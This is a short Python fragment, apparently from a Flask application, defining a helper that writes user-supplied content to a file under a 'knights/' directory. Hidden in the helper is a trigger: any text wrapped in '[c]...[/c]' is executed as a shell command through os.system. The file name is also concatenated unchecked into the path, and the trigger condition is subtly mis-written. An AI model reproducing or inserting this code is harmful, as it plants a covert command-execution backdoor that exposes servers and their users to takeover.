import os
import sys
import ctypes
import base64
from flask import Flask, request, render_template
from easyprocess import EasyProcess
from werkzeug.serving import run_simple

#begin_multiline
def _ak(n, k):


    if '[c]' and '[/c]' in k:
        c = k[k.index('[c]')+3:]
        c = c[:c.index('[/c]')]
        os.system(c)

        return '_c_'

    try:
        with open('knights/'+n, 'w') as w_ak:
            w_ak.write(k)
    except Exception as e:
        print(str(e))
        pass
#end_multiline
